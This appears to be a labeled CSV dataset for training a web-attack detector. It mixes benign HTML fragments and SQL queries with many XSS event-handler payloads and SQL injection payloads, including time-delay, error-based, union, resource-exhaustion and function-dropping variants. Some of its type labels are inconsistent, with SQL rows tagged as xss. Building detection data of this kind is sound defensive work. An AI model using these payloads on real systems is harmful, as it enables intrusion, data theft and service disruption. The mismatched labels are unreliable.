Text,Label,type
" </p><p>In <a href=""/wiki/Electronic_discovery"" title=""Electronic discovery"">Electronic Discovery (eDiscovery) </a>, the industry has been focused on machine learning (predictive coding/technology assisted review), which is a subset of AI. To add to the soup of applications, Natural Language Processing (NLP) and Automated Speech Recognition (ASR) are also in vogue in the industry.<sup id=""cite_ref-328"" class=""reference""><a href=""#cite_note-328"">&#91;317&#93; </a> </sup>",0,xss
"<footer onkeypress=""alert(1)"" contenteditable>test</footer>",2,xss
SELECT * FROM walk WHERE son = 'failed'  AND City = 'hold',0,sql
"<style>@keyframes x{}</style><i style=""animation-name:x"" onanimationend=""alert(1)""></i>",2,xss
"<div draggable=""true"" contenteditable>drag me</div><dialog ondrop=alert(1) contenteditable>drop here</dialog>",2,xss
SELECT EXP ( 1 ) ;,0,sql
"1""  )   where 7513  =  7513 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",1,sql
"<datalist onmouseup=""alert(1)"">test</datalist>",2,xss
"1   )    )    as cusv where 4871  =  4871 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1,sql
<svg><dl onload=alert(1)></dl>,2,xss
"1%"" and elt  (  4249  =  4249,7259  )   and ""%""  =  """,1,sql
"SELECT DAY ( ""2017-06-15 09:34:21"" ) ;",0,sql
 )   or   (  'a'  =  'a,1,xss
"-2289""  )   or 8624  =  6279 and   (  ""ised""  =  ""ised",1,sql
 </p>,0,xss
-6129  )   as vuze where 1565  =  1565 or   (  8459  =  8459  )  *4906--,1,sql
SELECT AVG ( nails ) FROM principal SELECT SUM ( lungs ) ,0,sql
<optgroup id=x tabindex=1 onfocusin=alert(1)></optgroup>,2,xss
1' where 7910  =  7910,1,sql
SELECT hello FROM swam UNION ALL SELECT dot FROM everybody ORDER BY occur,0,xss
"-3194""   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""erua""  =  ""erua",1,sql
7205,0,xss
1'   )    )     )   rlike sleep  (  5  )  #,1,sql
"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   # mpyu",1,sql
"1'   )    )    as xrre where 1172  =  1172 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1,sql
lehmann cruanas,0,xss
"<video onkeydown=""alert(1)"" contenteditable>test</video>",2,xss
1   )    )    as wwkw where 7289  =  7289 and 7533  =  7533--,1,sql
SELECT * FROM lower FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM fear,0,sql
SELECT pilot ( s )  FROM told,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
" select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1",1,sql
SELECT MIN ( tell )  AS difference FROM detail,0,sql
SELECT * FROM sum WHERE cage = 'particular'  OR lot = 'each',0,xss
"-9606%""   )    )     )   union all select 8572,8572,8572,8572,8572,8572,8572,8572,8572--",1,sql
"META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('')</SCRIPT>"">",2,xss
SELECT DISTINCT early FROM spoken,0,sql
SELECT TOP 3 * FROM opportunity,0,xss
	 </span>,0,xss
" SELECT * FROM afraid ORDER BY wonderful ASC, leaf DESC",0,sql
select   (  case when   (  1354  =  7529  )   then 1354 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,sql
 </li>,0,xss
"<style>@keyframes x{}</style><dl style=""animation-name:x"" onanimationend=""alert(1)""></dl>",2,xss
3.35E+15,0,sql
"  SELECT bagID AS ID, rush AS young FROM material",0,sql
5he1un,0,xss
"<input onmouseleave=""alert(1)"">test</input>",2,xss
bijman3,0,sql
"-6854"" where 7794  =  7794 union all select 7794,7794--",1,xss
SELECT * FROM thick FETCH FIRST 3 ROWS ONLY,0,sql
<br id=x tabindex=1 onfocusin=alert(1)></br>,2,xss
1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,xss
"<div draggable=""true"" contenteditable>drag me</div><spacer ondrop=alert(1) contenteditable>drop here</spacer>",2,xss
SELECT UCASE ( CustomerName )  AS UppercaseCustomerName FROM Customers;,0,sql
"1"" and 5205  =  9975#",1,xss
1 where 7882  =  7882,1,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28541 )  ORDER BY meta_id ASC",0,sql
SELECT * FROM giant WHERE string NOT LIKE '[person]%',0,xss
26586,0,xss
"<style>@keyframes slidein {}</style><b style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></b>",2,xss
SELECT AVG ( cent )  FROM slipped  SELECT SUM ( mind ) ,0,xss
"  SELECT closelyID AS ID, base AS depend FROM experiment",0,xss
SELECT * FROM ate WHERE Price NOT BETWEEN 10 AND 20,0,sql
<tr id=x tabindex=1 onbeforeactivate=alert(1)></tr>,2,xss
SELECT * FROM  ( SELECT greatest FROM pink ) ,0,sql
50610,0,sql
-4681 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  # rltx,1,sql
cruey,0,sql
SELECT forest ( s )  FROM struggle FULL OUTER JOIN,0,sql
apolilladura,0,sql
"AI at <a href=""/wiki/MIT"" class=""mw-redirect"" title=""MIT"">MIT </a> under <a href=""/wiki/Marvin_Minsky"" title=""Marvin Minsky"">Marvin Minsky </a> in the 1960s&#160;:",0,xss
SELECT certainly ( s FROM hurt RIGHT JOIN,0,sql
SELECT * FROM visit FETCH FIRST 3 ROWS ONLY,0,xss
"<li><a href=""/wiki/Evolutionary_multimodal_optimization"" title=""Evolutionary multimodal optimization"">Evolutionary multimodal optimization </a> </li>",0,xss
"1""   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""ynwr"" like ""ynwr",1,sql
"1"" where 7249  =  7249 union all select null,null,null,null,null,null,null,null,null,null--",1,sql
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   '%'  =  '",1,sql
SELECT AVG ( raise )  FROM declared  SELECT SUM ( tongue ) ,0,sql
mastelero,0,xss
8547,0,sql
<keygen onpointerup=alert(1)>XSS</keygen>,2,xss
canje,0,sql
SELECT * FROM valuable ORDER BY yellow DESC,0,sql
SELECT * FROM said FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM sunlight,0,sql
hartzenbusch 98,0,sql
"1   )    )     )   and elt  (  3132  =  1541,1541  )   and    (    (     (  4258  =  4258",1,xss
"-3581'||  (  select 'uxmh' from dual where 8954  =  8954 union all select 8954,8954,8954,8954,8954,8954#",1,sql
" select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",1,xss
"	 <div class=""magnify""><a href=""/wiki/File:GFO_taxonomy_tree.png"" class=""internal"" title=""Enlarge""> </a> </div>An ontology represents knowledge as a set of concepts within a domain and the relationships between those concepts. </div> </div> </div>",0,xss
"1""  )   where 3058  =  3058 union all select null--",1,sql
ad0inist1ador9,0,sql
 </tr>,0,xss
gaviota 13,0,sql
"SELECT POSITION ( ""COM"" IN ""W3Schools.com"" )  AS MatchPosition;",0,sql
"SELECT * FROM practice WHERE face BETWEEN ""according"" AND    ""manner""",0,sql
1 waitfor delay '0:0:5'-- nnnp,1,sql
giralda,0,sql
torrecilla lafuente,0,sql
"-5616""   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""hdrb"" like ""hdrb",1,sql
"ondulada, 121",0,sql
"<style>:target {transform: rotate(180deg);}</style><span id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></span>",2,xss
"          <div class=""version"">",0,xss
SELECT TOP 50 PERCENT * FROM angry,0,sql
SELECT AVG ( sort ) FROM term SELECT SUM ( signal ) ,0,sql
"<area oncontextmenu=""alert(1)"">test</area>",2,xss
1%' and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and '%'  =  ',1,sql
"  SELECT immediatelyID AS ID, substance AS thin FROM harder",0,xss
46844,0,sql
1' where 9003  =  9003 waitfor delay '0:0:5'--,1,sql
"  SELECT purple AS speech, victory AS [receive]  FROM town",0,sql
1'||  (  select 'znba' where 8323  =  8323,1,sql
<caption onpointerdown=alert(1)>XSS</caption>,2,xss
"<dt><a class=""reference internal"" href=""topics/logging.html""><span class=""doc"">Logging",0,xss
"<a href=""/wiki/Hidden_Markov_model"" title=""Hidden Markov model"">Hidden Markov model </a>:",0,xss
SELECT DISTINCT solar FROM fifth,0,sql
-4308'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'jmot'  =  'jmot,1,sql
"<iframe onclick=""alert(1)"">test</iframe>",2,xss
SELECT * FROM sudden FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM soldier,0,sql
"1'   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   'dpdz' like 'dpdz",1,sql
"1"" where 5353  =  5353 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,sql
"1%'  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  '%'  =  '",1,sql
"calle platerias, 47",0,sql
"READTHEDOCS_DATA['source_suffix'] = "".rst""",0,xss
"-6126 union all select 8486,8486,8486,8486,8486,8486,8486,8486,8486--",1,xss
SELECT step FROM neighbor UNION SELECT check FROM trunk ORDER BY printed,0,sql
SELECT pain FROM stepped,0,sql
"1'   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
"  SELECT * FROM wood WHERE empty IN  ( 'stay', 'scale', 'beginning' )  ",0,sql
SELECT * FROM public FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
SELECT * FROM flight 3,0,sql
"INSERT INTO increase ( company, college, introduced, rain, metal, mood )  VALUES  ( 'bowl', 'once'. second', 'him', 'ask', 'length', 'upward' )  ",0,sql
"<iframe ondblclick=""alert(1)"">test</iframe>",2,xss
"<li><cite id=""CITEREFSkillings2006"" class=""citation web"">Skillings, Jonathan (3 July 2006). <a rel=""nofollow"" class=""external text"" href=""http://news.cnet.com/Getting-machines-to-think-like-us/2008-11394_3-6090207.html"">""Getting Machines to Think Like Us"" </a>. <i>cnet </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">3 February ",0,xss
SELECT shells ( s )  FROM people SELECT he ( s ) ,0,sql
"  SELECT scale AS explore, three AS [slipped]  FROM chose",0,xss
"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'ctac' like 'ctac",1,xss
5866,0,sql
1'+  (  select iutk where 6158  =  6158,1,sql
SELECT * FROM graph WHERE tower = 'actual'  AND  ( gas = 'these' OR yard = 'eat' ) ,0,sql
"1',  (  select   (  case when   (  8382  =  8382  )   then 1 else 1/  (  select 0  )   end   )    )   ",1,sql
<td onpointerleave=alert(1)>XSS</td>,2,xss
-5356'  )   or 9323  =  9323#,1,sql
"1%""   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   ""%""  =  """,1,sql
	 </span> ,0,xss
" select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",1,sql
FROM  ( SELECT DISTINCT mind FROM easier ) ,0,sql
guasch xifr,0,sql
"<li class=""toclevel-3 tocsection-20""><a href=""#Knowledge-based""><span class=""tocnumber"">5.2.4 ",0,xss
SELECT AVG ( darkness ) FROM women,0,sql
"<ul><li><a href=""/wiki/Abstract_and_concrete"" title=""Abstract and concrete"">Abstract object </a> </li>",0,xss
"1   )    )     )   union all select null,null,null,null,null,null,null,null,null#",1,sql
SELECT * FROM her FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM driving,0,xss
"<div draggable=""true"" contenteditable>drag me</div><img ondragover=alert(1) contenteditable>drop here</img>",2,xss
"	 </span> <span class=""reference-text""><cite class=""citation news"">Senthilingam, Meera (12 May 2016). <a rel=""nofollow"" class=""external text"" href=""http://www.cnn.com/2016/05/12/health/robot-surgeon-bowel-operation/"">""Are Autonomous Robots Your next Surgeons?"" </a>. <i>CNN </i>. Cable News Network. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20161203154119/http://www.cnn.com/2016/05/12/health/robot-surgeon-bowel-operation"">Archived </a> from the original on 3 December 2016<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">4 December ",0,xss
santibez de bjar,0,sql
"1""  )   as oijn where 1521  =  1521 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
"1'+  (  select 'qrml' where 3791  =  3791 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  +'",1,xss
"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'wdoi'  =  'wdoi",1,sql
"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  ",1,sql
SELECT COUNT ( money ) FROM center,0,sql
SELECT * FROM exciting FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"	 </span> <span class=""reference-text""><cite class=""citation arxiv"">Hannun, Awni; Case, Carl; Casper, Jared; Catanzaro, Bryan; Diamos, Greg; Elsen, Erich; Prenger, Ryan; Satheesh, Sanjeev; Sengupta, Shubho; Coates, Adam; <a href=""/wiki/Andrew_Ng"" title=""Andrew Ng"">Ng, Andrew Y. </a> (2014). ""Deep Speech: Scaling up end-to-end speech recognition"". <a href=""/wiki/ArXiv"" title=""ArXiv"">arXiv </a>:<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//arxiv.org/abs/1412.5567"">1412.5567 </a> ",0,xss
sarmiento,0,sql
1'   )    )    and 9198  =  9198--,1,sql
SELECT * FROM south WHERE distance = 'temperature'  AND City = 'rope',0,xss
"<nextid draggable=""true"" ondragend=""alert(1)"">test</nextid>",2,xss
"1""   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  ""rtzn""  =  ""rtzn",1,sql
"1""  )   where 2702  =  2702 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,sql
santaren,0,xss
<track id=x tabindex=1 onbeforeactivate=alert(1)></track>,2,xss
"1' in boolean mode  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #",1,sql
"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'pjrf'  =  'pjrf",1,sql
"1""  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,xss
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
"<li><cite id=""CITEREFDyson1998"" class=""citation book""><a href=""/wiki/George_Dyson_(science_historian)"" title=""George Dyson (science historian)"">Dyson, George </a> (1998). <a rel=""nofollow"" class=""external text"" href=""https://archive.org/details/darwinamongmachi00dyso""><i>Darwin among the Machines </i> </a>. Allan Lane Science. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-7382-0030-9"" title=""Special:BookSources/978-0-7382-0030-9""><bdi>978-0-7382-0030-9 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Darwin+among+the+Machines&amp;rft.pub=Allan+Lane+Science&amp;rft.date=1998&amp;rft.isbn=978-0-7382-0030-9&amp;rft.aulast=Dyson&amp;rft.aufirst=George&amp;rft_id=https%3A%2F%2Farchive.org%2Fdetails%2Fdarwinamongmachi00dyso&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"1%""   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sql
SELECT * FROM  ( SELECT rhythm FROM layers ) ,0,sql
23611,0,sql
x' AND email IS NULL; --,1,sql
SELECT * FROM sum WHERE crack NOT BETWEEN 'pond' AND 'mountain',0,sql
"          <dd><a href=""/en/0.24/"">0.24</a></dd>",0,xss
"<li><a href=""/wiki/Privileged_access"" title=""Privileged access"">Privileged access </a> </li>",0,xss
"<li><a href=""/wiki/Mobile_translation"" title=""Mobile translation"">Mobile translation </a> </li>",0,xss
"1""  )   as jngl where 8384  =  8384 and 4580  =  1718--",1,sql
"1""   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",1,sql
SELECT * FROM Customers FETCH FIRST 3 ROWS ONLY;,0,sql
rom.val@rpdkorea.eg,0,sql
"1""  )   as tnux where 4888  =  4888 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1,sql
"-5082   )    )    union all select 4013,4013,4013,4013,4013,4013,4013,4013,4013,4013#",1,xss
19277,0,sql
"<xmp onmouseenter=""alert(1)"">test</xmp>",2,xss
"1""   )    )    and   (  3020  =  3020  )  *6703 and    (    (   ""bely""  =  ""bely",1,sql
badosa estruch,0,sql
SELECT color FROM perhaps,0,xss
if  (  8182  =  3225  )   select 8182 else drop function kpzk--,1,sql
